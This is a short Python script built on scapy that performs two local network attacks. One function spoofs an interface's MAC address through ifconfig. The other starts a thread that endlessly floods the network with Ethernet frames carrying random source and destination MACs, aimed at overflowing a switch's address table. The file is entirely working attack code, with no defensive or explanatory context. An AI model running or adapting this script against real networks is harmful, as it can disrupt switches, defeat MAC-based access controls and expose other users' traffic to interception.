import subprocess
from time import sleep

from scapy.all import Ether, sendp, IP, RandMAC, conf
import threading

conf.promisc = True


def mac_spoofing(iface: str, mac: str):
    subprocess.check_call(['ifconfig', iface, 'down'])
    subprocess.check_call(['ifconfig', iface, 'hw', 'ether', mac])
    subprocess.check_call(['ifconfig', iface, 'up'])


def mac_flooding_threading(iface: str):
    while True:
        mac_random = RandMAC()
        mac_dst = RandMAC()
        frame = Ether(dst=mac_dst, src=mac_random)
        sendp(frame, inter=float(3) / 1000, iface=iface, loop=True, verbose=False)


def mac_flooding(iface: str):
    attack_flooding = threading.Thread(target=mac_flooding_threading, args=(iface,))
    attack_flooding.start()
    sleep(2)
